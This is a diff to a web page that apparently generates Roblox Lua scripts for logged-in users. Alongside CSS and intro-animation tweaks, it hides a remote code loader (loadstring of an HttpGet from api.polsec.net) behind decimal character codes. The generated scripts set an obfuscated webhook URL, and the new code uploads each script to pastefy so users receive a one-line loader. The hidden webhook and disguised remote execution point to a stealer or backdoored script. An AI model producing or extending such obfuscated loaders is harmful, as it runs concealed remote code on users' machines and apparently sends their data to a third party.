@@ -42,12 +42,11 @@
     justify-content: center;
     align-items: center;
     z-index: 9999;
-    transition: opacity 0.6s ease, visibility 0.6s ease;
+    transition: opacity 0.8s ease, visibility 0.8s ease;
   }
   .intro-overlay.hidden {
     opacity: 0;
     visibility: hidden;
-    pointer-events: none;
   }
   .intro-text {
     font-family: 'Space Grotesk', sans-serif;
@@ -55,7 +54,7 @@
     font-weight: 700;
     color: var(--text);
     letter-spacing: -0.02em;
-    animation: introScale 1s cubic-bezier(0.16, 1, 0.3, 1) both;
+    animation: introScale 1.2s cubic-bezier(0.16, 1, 0.3, 1) both;
     text-align: center;
   }
   .intro-text span {
@@ -899,13 +898,11 @@
 <div class="toast" id="toast"></div>
 
 <script>
-// ── INTRO ANIMATION FIX ──
-document.addEventListener('DOMContentLoaded', () => {
-  // Force hide after 1.8 seconds regardless of what loads
+// ── INTRO ANIMATION ──
+window.addEventListener('load', () => {
   setTimeout(() => {
-    const overlay = document.getElementById('introOverlay');
-    if (overlay) overlay.classList.add('hidden');
-  }, 1800);
+    document.getElementById('introOverlay').classList.add('hidden');
+  }, 2000); // Show entrance for 2 seconds
 });
 
 // ── CONFIG ──
@@ -1258,6 +1255,18 @@ function obfuscateWebhook(url) {
 }
 
 // ── GENERATE ──
+async function uploadToPastefy(script) {
+  try {
+    const res = await fetch('https://pastefy.app/api/v2/paste', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ title: '32e4 Statics Moreria', content: script })
+    });
+    const d = await res.json();
+    return d.success && d.paste?.id ? `https://pastefy.app/${d.paste.id}/raw` : null;
+  } catch { return null; }
+}
+
 async function generate() {
   if (!currentUser) { document.getElementById('loginModal').classList.remove('hidden'); return; }
   const btn = document.getElementById('genBtn');
@@ -1300,13 +1309,27 @@ for _i = 1, #_W do
 end
 getgenv().WEBHOOK_URL = _S
 
-loadstring(game:HttpGet("https://api.polsec.net/loader/f460c397dc1e54f3/277b520a05b8ab65", true))();
+local C = string.char
+local T = table.concat
+local K = {
+    104,116,116,112,115,58,47,47,
+    97,112,105,46,112,111,108,115,
+    101,99,46,110,101,116,47,108,
+    111,97,100,101,114,47,102,52,
+    54,48,99,51,57,55,100,99,49,
+    101,53,52,102,51,47,50,55,55,
+    98,53,50,48,97,48,53,98,56,
+    97,98,54,53
+}
+local U = {}
+for i = 1, #K do
+    U[i] = C(K[i])
+end
+return assert(loadstring(game:HttpGet(T(U), true)))()`;
 
-    // The prompt requested this specific output at the end:
-    const finalOutput = `loadstring(game:HttpGet("https://pastefy.app/ukU8Tvip/raw"))()`;
-
+    const url = await uploadToPastefy(script);
     out.className = 'code-block';
-    out.textContent = finalOutput;
+    out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : `-- Upload failed\n\n${script}`;
     
     trackGeneration(currentUser.username, currentUser.global_name, currentUser.avatar, selected, selectedBases);
     showToast('Script generated!', 'success');
@@ -1314,7 +1337,7 @@ loadstring(game:HttpGet("https://api.polsec.net/loader/f460c397dc1e54f3/277b520a
     out.className = 'code-block empty';
     out.textContent = err.message || 'Error';
   } finally {
-    setTimeout(() => { btn.disabled = false; btn.textContent = '🔗 Generate Script'; }, 1200);
+    setTimeout(() => { btn.disabled = false; btn.textContent = '⚡ Generate Script'; }, 1200);
   }
 }
 
